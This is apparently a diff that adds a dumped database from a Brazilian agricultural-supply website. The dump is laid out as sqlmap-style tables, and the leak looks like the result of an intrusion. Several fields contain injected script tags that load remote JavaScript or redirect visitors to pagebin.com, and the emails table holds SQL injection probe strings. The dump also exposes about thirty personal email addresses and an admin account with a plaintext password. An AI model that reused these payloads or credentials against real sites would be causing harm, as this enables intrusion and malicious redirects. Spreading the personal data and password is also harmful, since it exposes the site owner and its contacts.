+| 11     | 2014-10-22 | 11244105.jpg | <div>OS ADUBOS ORG\xc2NICOS</div>\r\n<div>Torta de Ma                                          | Quais os tipos de adubo                                                                        |
+| 14     | 2015-04-12 | 11365557.jpg | <p>\xa0Dos diversos temas ligados ao meio ambiente q                                           | <blank>                                                                                        |
+| 16     | 2016-01-25 | <blank>      | <script type="text/javascript" src="http://yourjavascript.com/1322662415/kokokok.js"></script> | <script type="text/javascript" src="http://yourjavascript.com/1322662415/kokokok.js"></script> |
+| 17     | 2016-01-25 | <blank>      | <script language= "JavaScript"> location.href="http://pagebin.com/qzJS5mrT" </script>          | <script language= "JavaScript"> location.href="http://pagebin.com/qzJS5mrT" </script>          |
++--------+------------+--------------+------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------+
+
+Database: agrofort_bd
+Table: emails
+[31 entries]
++----------+---------+------------------------------------------------------------------+------------+--------------------------------------------------------------------------------------------------------+
+| email_id | cel     | nome                                                             | data       | email_desc                                                                                             |
++----------+---------+------------------------------------------------------------------+------------+--------------------------------------------------------------------------------------------------------+
+| 18       | <blank> | <script language= "JavaScript"> location.href="http://pagebin.co | 0000-00-00 | <script language= "JavaScript"> location.href="http://pagebin.com/3MHmCcr9" </script>                  |
+| 19       | <blank> | ruanzinhuh.gyn                                                   | 0000-00-00 | ruanzinhuh.gyn@hotmail.com                                                                             |
+| 20       | <blank> | <blank>                                                          | 0000-00-00 | <blank>                                                                                                |
+| 21       | <blank> | caturnave                                                        | 0000-00-00 | caturnave@gmail.com                                                                                    |
+| 22       | <blank> | joscicleia861121                                                 | 0000-00-00 | joscicleia861121@gmail.com                                                                             |
+| 23       | <blank> | www.google.com/intl/en/policies/terms/                           | 0000-00-00 | www.google.com/intl/en/policies/terms/                                                                 |
+| 24       | <blank> | kauan.souto123                                                   | 0000-00-00 | kauan.souto123@gmail.com                                                                               |
+| 25       | <blank> | joaojosetu                                                       | 0000-00-00 | joaojosetu@gmail.com                                                                                   |
+| 26       | <blank> | robertino1988                                                    | 0000-00-00 | robertino1988@live.com                                                                                 |
+| 27       | <blank> | ww                                                               | 0000-00-00 | ww                                                                                                     |
+| 28       | <blank> | inFA                                                             | 0000-00-00 | inFA                                                                                                   |
+| 29       | <blank> | 6664                                                             | 0000-00-00 | 6664                                                                                                   |
+| 30       | <blank> | inFA..(,'),"))                                                   | 0000-00-00 | inFA..(,'),"))                                                                                         |
+| 31       | <blank> | inFA'vJHOBU<'">EDMaKg                                            | 0000-00-00 | inFA'vJHOBU<'">EDMaKg                                                                                  |
+| 32       | <blank> | inFA') AND 5892=7562 AND ('Lvss'='Lvss                           | 0000-00-00 | inFA') AND 5892=7562 AND ('Lvss'='Lvss                                                                 |
+| 33       | <blank> | inFA') AND 5128=5128 AND ('QyWs'='QyWs                           | 0000-00-00 | inFA') AND 5128=5128 AND ('QyWs'='QyWs                                                                 |
+| 34       | <blank> | inFA' AND 7348=8061 AND 'SGcL'='SGcL                             | 0000-00-00 | inFA' AND 7348=8061 AND 'SGcL'='SGcL                                                                   |
+| 35       | <blank> | inFA' AND 5128=5128 AND 'lMfj'='lMfj                             | 0000-00-00 | inFA' AND 5128=5128 AND 'lMfj'='lMfj                                                                   |
+| 36       | <blank> | inFA%' AND 1330=6295 AND '%'='                                   | 0000-00-00 | inFA%' AND 1330=6295 AND '%'='                                                                         |
+| 37       | <blank> | inFA%' AND 5128=5128 AND '%'='                                   | 0000-00-00 | inFA%' AND 5128=5128 AND '%'='                                                                         |
+| 38       | <blank> | inFA) AND 4091=8726 AND (1061=1061                               | 0000-00-00 | inFA) AND 4091=8726 AND (1061=1061                                                                     |
+| 39       | <blank> | inFA) AND 5128=5128 AND (2572=2572                               | 0000-00-00 | inFA) AND 5128=5128 AND (2572=2572                                                                     |
+| 40       | <blank> | inFA AND 3398=1618                                               | 0000-00-00 | inFA AND 3398=1618                                                                                     |
+| 41       | <blank> | inFA AND 5128=5128                                               | 0000-00-00 | inFA AND 5128=5128                                                                                     |
+| 42       | <blank> | inFA AND 7813=3851-- yQnX                                        | 0000-00-00 | inFA AND 7813=3851-- yQnX                                                                              |
+| 43       | <blank> | inFA AND 5128=5128-- zYbH                                        | 0000-00-00 | inFA AND 5128=5128-- zYbH                                                                              |
+| 44       | <blank> | (SELECT (CASE WHEN (4529=2094) THEN 4529 ELSE 4529*(SELECT 4529  | 0000-00-00 | (SELECT (CASE WHEN (4529=2094) THEN 4529 ELSE 4529*(SELECT 4529 FROM INFORMATION_SCHEMA.PLUGINS) END)) |
+| 45       | <blank> | (SELECT (CASE WHEN (9484=9484) THEN 9484 ELSE 9484*(SELECT 9484  | 0000-00-00 | (SELECT (CASE WHEN (9484=9484) THEN 9484 ELSE 9484*(SELECT 9484 FROM INFORMATION_SCHEMA.PLUGINS) END)) |
+| 46       | <blank> | claudioboliveira                                                 | 0000-00-00 | claudioboliveira@gmail.com                                                                             |
+| 47       | <blank> | informações                                                      | 0000-00-00 | informações                                                                                            |
+| 48       | <blank> | Boa tarde vcs tem broca de perfuradora de solo manual..          | 0000-00-00 | Boa tarde vcs tem broca de perfuradora de solo manual..                                                |
++----------+---------+------------------------------------------------------------------+------------+--------------------------------------------------------------------------------------------------------+
+
+Database: agrofort_bd
+Table: especialidade
+[0 entries]
++--------+----------+-----------+
+| cli_id | cli_nome | cli_email |
++--------+----------+-----------+
++--------+----------+-----------+
+
+Database: agrofort_bd
+Table: eventos
+[1 entry]
++--------+-----------+---------+---------+---------+---------+----------+------------+----------+-------------+-----------+-----------+-------------+---------------+----------------+
+| eve_id | eve_video | eve_end | eve_tel | eve_cat | eve_cel | eve_nome | eve_data   | eve_desc | eve_foto    | eve_local | eve_espec | eve_mostrar | eve_tempo_ser | eve_cod_imagem |
++--------+-----------+---------+---------+---------+---------+----------+------------+----------+-------------+-----------+-----------+-------------+---------------+----------------+
+| 12     | <blank>   | <blank> | <blank> | <blank> | <blank> | Teste    | 0000-00-00 | Teste    | 9082216.jpg | <blank>   | 0         | 1           | <blank>       | <blank>        |
++--------+-----------+---------+---------+---------+---------+----------+------------+----------+-------------+-----------+-----------+-------------+---------------+----------------+
+
+Database: agrofort_bd
+Table: eventos_fotos
+[5 entries]
++--------+---------+--------------+-----------+
+| fot_id | fot_eve | fot_foto     | fot_nome  |
++--------+---------+--------------+-----------+
+| 60     | 8       | 11021938.jpg | Vacinação |
+| 61     | 9       | 10245371.jpg | <blank>   |
+| 63     | 9       | 10246024.jpg | Cesta     |
+| 64     | 11      | 3242901.jpg  | <blank>   |
+| 65     | 11      | 3243055.jpg  | <blank>   |
++--------+---------+--------------+-----------+
+
+Database: agrofort_bd
+Table: marcas
+[6 entries]
++--------+---------+---------+--------------+----------+----------+-----------+-----------+
+| mar_id | mar_ano | mar_pos | mar_img      | mar_desc | mar_nome | mar_preco | mar_marca |
++--------+---------+---------+--------------+----------+----------+-----------+-----------+
+| 23     | <blank> | 0       | 10083729.jpg | <blank>  | Baldan   | <blank>   | <blank>   |
+| 25     | <blank> | 0       | 10151971.png | <blank>  | Thebe    | <blank>   | <blank>   |
+| 26     | <blank> | 0       | 10291276.jpg | <blank>  | Rochfer  | <blank>   | <blank>   |
+| 27     | <blank> | 0       | 7324351.jpg  | <blank>  | Esab     | <blank>   | <blank>   |
+| 28     | <blank> | 0       | 4313320.jpg  | <blank>  | Bosch    | <blank>   | <blank>   |
+| 29     | <blank> | 0       | 7284179.jpg  | <blank>  | <blank>  | <blank>   | <blank>   |
++--------+---------+---------+--------------+----------+----------+-----------+-----------+
+
+Database: agrofort_bd
+Table: modulos
+[15 entries]
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+| mod_id | mod_nome               | mod_menu | mod_ordem | mod_pg_pre | mod_status | mod_pg_novo    | mod_pg_edit    | mod_pg_lista   | mod_pg_config    | mod_bd_config       |
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+| 1      | Usuarios do sistema    | sim      | 1         | usu        | 2          | usu_novo       | usu_edit       | usuarios       | usu_config       | config_usuarios     |
+| 3      | Categorias dinamicas   | sim      | 3         | cat        | 2          | cat_novo       | cat_edit       | categorias     | cat_config       | config_categorias   |
+| 4      | Produtos administrador | nao      | 4         | pro        | 2          | pro_novo       | pro_edit       | produtos       | pro_config       | config_produtos     |
+| 5      | Parceiros              | sim      | 5         | mar        | 1          | mar_novo       | mar_edit       | marcas         | mar_config       | config_marcas       |
+| 12     | Atendimento            | nao      | 5         | fot        | 1          | fot_eve_novo   | fot_eve_edit   | fotos_eve      | <blank>          | config_atendimento  |
+| 13     | Dicas                  | sim      | 7         | dic        | 1          | dic_novo       | dic_edit       | dicas          | dic_config       | config_dicas        |
+| 14     | Eventos                | nao      | 6         | eve        | 2          | eve_novo&cat=1 | eve_edit       | eventos&cat=1  | eve_config       | config_eventos      |
+| 15     | portifolio             | nao      | 11        | eve        | 2          | eve_novo&cat=2 | eve_edit       | eventos&cat=2  | eve_config       | config_portifolio   |
+| 16     | Clientes               | nao      | 10        | fot        | 1          | fot_novo       | fot_edit       | fot_eve&eve=2  | fot_config       | config_clientes     |
+| 17     | Equipamentos           | nao      | 12        | fotos_eve  | 1          | fotos_eve_novo | fotos_eve_edit | eventos&cat=3  | fotos_eve_config | config_equipamentos |
+| 18     | Infra-estrutura        | sim      | 11        | fot        | 1          | fot_novo       | fot_edit       | fot_eve&eve=11 | fot_config       | config_infraestrut  |
+| 20     | Novidades              | nao      | 20        | dic        | 2          | dic_novo       | dic_edit       | dicas          | dic_config       | config_noticias     |
+| 23     | Newsletter             | sim      | 21        | cat        | 2          | mala_novo      | mala_edit      | mala           | mala_config      | config_mala         |
+| 24     | Emails                 | sim      | 22        | cat        | 2          | mala_novo      | mala_edit      | mala           | mala_config      | config_email        |
+| 27     | Cadastros              | sim      | 22        | <blank>    | 1          | <blank>        | <blank>        | <blank>        | <blank>          | config_cadastros    |
++--------+------------------------+----------+-----------+------------+------------+----------------+----------------+----------------+------------------+---------------------+
+
+Database: agrofort_bd
+Table: novidades
+[6 entries]
++--------+-------------+------------+-----------+------------------------------------------------------------------------------------------------+
+| nov_id | nov_foto    | nov_data   | nov_texto | nov_titulo                                                                                     |
++--------+-------------+------------+-----------+------------------------------------------------------------------------------------------------+
+| 37     | 9351497.jpg | 2014-10-22 | <blank>   | <blank>                                                                                        |
+| 38     | 9352425.jpg | 2014-10-22 | <blank>   | <blank>                                                                                        |
+| 39     | 9353085.jpg | 2014-10-22 | <blank>   | <blank>                                                                                        |
+| 40     | 4321784.jpg | 2015-05-02 | <blank>   | <blank>                                                                                        |
+| 41     | 2433595.jpg | 2015-04-12 | <blank>   | <blank>                                                                                        |
+| 42     | <blank>     | 2016-01-25 | <blank>   | <script type="text/javascript" src="http://yourjavascript.com/1322662415/kokokok.js"></script> |
++--------+-------------+------------+-----------+------------------------------------------------------------------------------------------------+
+
+Database: agrofort_bd
+Table: paisagismo
+[0 entries]
++--------+----------+----------+-----------+
+| pro_id | pro_foto | pro_nome | pro_foto2 |
++--------+----------+----------+-----------+
++--------+----------+----------+-----------+
+
+Database: agrofort_bd
+Table: produtos
+[5 entries]
++--------+-----------+------------+---------------------+---------+---------+----------------------------------------------------------------------------------------------------------------------------------------+---------------------+-------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+| pro_id | pro_video | cat_id_aux | pro_disponibilidade | pro_des | pro_cat | pro_desc                                                                                                                               | pro_nome            | pro_foto    | pro_peso | pro_marca | pro_preco | pro_promo | pro_detalhes | pro_desconto_1 | pro_desconto_2 | pro_especificacoes | pro_preco_anterior | pro_caracteristicas | pro_titulo_detalhes | pro_titulo_especificacoes | pro_titulo_caracteristicas |
++--------+-----------+------------+---------------------+---------+---------+----------------------------------------------------------------------------------------------------------------------------------------+---------------------+-------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+| 399    | NULL      | 1          | <blank>             | 1       | 74      | <p>desc teste 123 sdfdsfdsfsdfsdfsdfsdfsdfsdfdsfsdfsdfsdfdsfs</p>\r\n<p>sdfdsfdsfdsfdsf</p>\r\n<p>sdfdsfsdfsdf</p>\r\n<p>sdfdsfsdf</p> | teste 123           | 4036652.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 400    | NULL      | 1          | <blank>             | 1       | 74      | <blank>                                                                                                                                | asdfasd fasdf asdf  | 4344071.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 401    | NULL      | 1          | <blank>             | 1       | 74      | <blank>                                                                                                                                | asd fasd fasd fasdf | 4346003.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 402    | NULL      | 1          | <blank>             | 1       | 74      | <blank>                                                                                                                                | fasdf asdf asdfsf   | 4351004.jpg | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
+| 403    | NULL      | 1          | <blank>             | 1       | 53      | <p>\xa0sdfsdfdsf</p>                                                                                                                   | fsdfsdf             | <blank>     | <blank>  | NULL      | <blank>   | nao       | NULL         | NULL           | NULL           | NULL               | <blank>            | NULL                | NULL                | NULL                      | NULL                       |
++--------+-----------+------------+---------------------+---------+---------+----------------------------------------------------------------------------------------------------------------------------------------+---------------------+-------------+----------+-----------+-----------+-----------+--------------+----------------+----------------+--------------------+--------------------+---------------------+---------------------+---------------------------+----------------------------+
+
+Database: agrofort_bd
+Table: produtos_fotos
+[0 entries]
++--------+---------+----------+----------+
+| fot_id | fot_pro | fot_foto | fot_nome |
++--------+---------+----------+----------+
++--------+---------+----------+----------+
+
+Database: agrofort_bd
+Table: produtos_informacoes
+[0 entries]
++--------+---------+----------+----------+
+| inf_id | inf_pro | inf_desc | inf_nome |
++--------+---------+----------+----------+
++--------+---------+----------+----------+
+
+Database: agrofort_bd
+Table: usuarios
+[1 entry]
++--------+----------+-----------+-----------+-----------+
+| usu_id | usu_nome | usu_login | usu_senha | usu_email |
++--------+----------+-----------+-----------+-----------+
+| 1      | admin    | admin     | admin9999 | <blank>   |
++--------+----------+-----------+-----------+-----------+
+
